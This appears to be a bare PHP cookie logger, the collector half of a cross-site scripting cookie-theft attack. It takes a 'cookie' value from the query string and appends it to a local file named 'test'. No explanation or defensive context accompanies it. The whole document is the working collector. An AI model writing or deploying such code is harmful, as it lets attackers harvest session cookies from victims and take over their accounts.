<?php

$cookie = $_GET['cookie'];
$f = fopen('test','a');
fwrite($f,'cookie: '.$cookie.' ');

?>